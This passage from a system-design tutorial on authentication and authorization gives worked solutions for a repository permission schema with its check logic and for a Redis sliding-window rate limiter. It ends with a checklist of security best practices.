  PRIMARY KEY (repo_id, user_id)
);

CREATE TABLE teams (
  id UUID PRIMARY KEY,
  org_id UUID REFERENCES organizations(id),
  name VARCHAR(255) NOT NULL
);

CREATE TABLE team_members (
  team_id UUID REFERENCES teams(id),
  user_id UUID REFERENCES users(id),
  PRIMARY KEY (team_id, user_id)
);

CREATE TABLE team_repo_access (
  team_id UUID REFERENCES teams(id),
  repo_id UUID REFERENCES repositories(id),
  permission VARCHAR(50) NOT NULL, -- 'admin', 'write', 'read'
  PRIMARY KEY (team_id, repo_id)
);
```

```javascript
// Permission check
async function canPerformAction(userId, repoId, action) {
  const repo = await db.repositories.findById(repoId);
  
  // Public repos: Anyone can read
  if (repo.visibility === 'public' && action === 'read') {
    return true;
  }
  
  // Check org ownership
  const orgMember = await db.orgMembers.findOne({
    orgId: repo.orgId,
    userId,
    role: 'owner'
  });
  
  if (orgMember) {
    return true; // Org owners can do anything
  }
  
  // Check direct collaborator
  const collaborator = await db.repoCollaborators.findOne({
    repoId,
    userId
  });
  
  if (collaborator) {
    return hasPermission(collaborator.permission, action);
  }
  
  // Check team access
  const teamAccess = await db.query(`
    SELECT tra.permission
    FROM team_repo_access tra
    JOIN team_members tm ON tra.team_id = tm.team_id
    WHERE tra.repo_id = $1 AND tm.user_id = $2
  `, [repoId, userId]);
  
  if (teamAccess.length > 0) {
    const maxPermission = getMaxPermission(teamAccess.map(t => t.permission));
    return hasPermission(maxPermission, action);
  }
  
  return false;
}

function hasPermission(userPermission, action) {
  const permissions = {
    admin: ['read', 'write', 'delete', 'manage_collaborators', 'merge_pr'],
    write: ['read', 'write', 'create_pr'],
    read: ['read', 'create_issue']
  };
  
  return permissions[userPermission]?.includes(action) || false;
}

// List repos user has access to
async function getUserRepos(userId) {
  const repos = await db.query(`
    SELECT DISTINCT r.*
    FROM repositories r
    LEFT JOIN repo_collaborators rc ON r.id = rc.repo_id
    LEFT JOIN team_repo_access tra ON r.id = tra.repo_id
    LEFT JOIN team_members tm ON tra.team_id = tm.team_id
    LEFT JOIN org_members om ON r.org_id = om.org_id
    WHERE r.visibility = 'public'
       OR rc.user_id = $1
       OR tm.user_id = $1
       OR (om.user_id = $1 AND om.role = 'owner')
  `, [userId]);
  
  return repos;
}
```

</details>

---

### Exercise 3: Implement Rate Limiting

**Scenario:**
```
Implement a distributed rate limiting system:

Requirements:
├─ Support multiple rate limit tiers
│  ├─ Free: 100 requests/hour
│  ├─ Pro: 1,000 requests/hour
│  └─ Enterprise: 10,000 requests/hour
├─ Per-user and per-IP limiting
├─ Burst protection
├─ Redis-based (distributed)
└─ Return appropriate headers

Bonus:
├─ Different limits for different endpoints
├─ Sliding window algorithm
└─ Rate limit bypass for internal services
```

<details>
<summary>Solution Outline</summary>

```javascript
// Sliding window rate limiter
class RateLimiter {
  constructor(redis) {
    this.redis = redis;
  }
  
  async checkLimit(key, limit, windowSeconds) {
    const now = Date.now();
    const windowStart = now - (windowSeconds * 1000);
    
    // Use Redis sorted set
    // Score = timestamp, Value = unique request ID
    
    const multi = this.redis.multi();
    
    // Remove old entries
    multi.zremrangebyscore(key, 0, windowStart);
    
    // Count current requests
    multi.zcard(key);
    
    // Add current request
    multi.zadd(key, now, `${now}-${Math.random()}`);
    
    // Set expiration
    multi.expire(key, windowSeconds);
    
    const results = await multi.exec();
    const count = results[1][1];
    
    return {
      allowed: count < limit,
      current: count + 1,
      limit,
      remaining: Math.max(0, limit - count - 1),
      resetAt: now + (windowSeconds * 1000)
    };
  }
}

// Middleware
const rateLimitMiddleware = (options = {}) => {
  const limiter = new RateLimiter(redis);
  
  return async (req, res, next) => {
    // Determine user tier
    const userTier = req.user?.tier || 'free';
    const limits = {
      free: { limit: 100, window: 3600 },
      pro: { limit: 1000, window: 3600 },
      enterprise: { limit: 10000, window: 3600 }
    };
    
    const { limit, window } = limits[userTier];
    
    // Generate key
    const key = req.user 
      ? `rate_limit:user:${req.user.sub}`
      : `rate_limit:ip:${req.ip}`;
    
    // Check limit
    const result = await limiter.checkLimit(key, limit, window);
    
    // Set headers
    res.setHeader('X-RateLimit-Limit', result.limit);
    res.setHeader('X-RateLimit-Remaining', result.remaining);
    res.setHeader('X-RateLimit-Reset', new Date(result.resetAt).toISOString());
    
    if (!result.allowed) {
      return res.status(429).json({
        error: 'Rate limit exceeded',
        retryAfter: Math.ceil((result.resetAt - Date.now()) / 1000)
      });
    }
    
    next();
  };
};

app.use('/api/', rateLimitMiddleware());
```

</details>

---

## Summary

```
Authentication:
───────────────
✅ Use HTTPS always
✅ Hash passwords (bcrypt, scrypt)
✅ Implement MFA for sensitive accounts
✅ Consider passwordless (WebAuthn)
✅ Use refresh token rotation
✅ Rate limit login attempts

Authorization:
──────────────
✅ Principle of least privilege
✅ RBAC for simple cases
✅ ABAC for complex scenarios
✅ Resource-based permissions when needed
✅ Audit all permission changes

Security:
─────────
✅ Prevent SQL injection (parameterized queries)
✅ Prevent XSS (escape output, CSP)
✅ Prevent CSRF (tokens, SameSite cookies)
✅ Set security headers (Helmet.js)
✅ Encrypt sensitive data
✅ Use secrets management
✅ Rate limiting everywhere
✅ Monitor and log security events

Trade-offs:
───────────
Session vs JWT:
├─ Session: Control vs Complexity
└─ JWT: Stateless vs Revocation

OAuth vs Custom:
├─ OAuth: Standard vs Complexity
└─ Custom: Simple vs Maintenance

MFA:
├─ Security vs User friction
└─ More factors = More secure but harder to use
```

---

## Next Steps

- Study [Security Best Practices](../34-security/README.md) for deeper dive
- Practice [Design URL Shortener](../36-url-shortener/README.md) with auth
- Learn about [Data Privacy & Compliance](../35-privacy/README.md)

---

**Key Takeaway**: Security is not optional. Build it in from day one. Use proven standards (OAuth, WebAuthn) rather than rolling your own. Defense in depth: multiple layers of security.
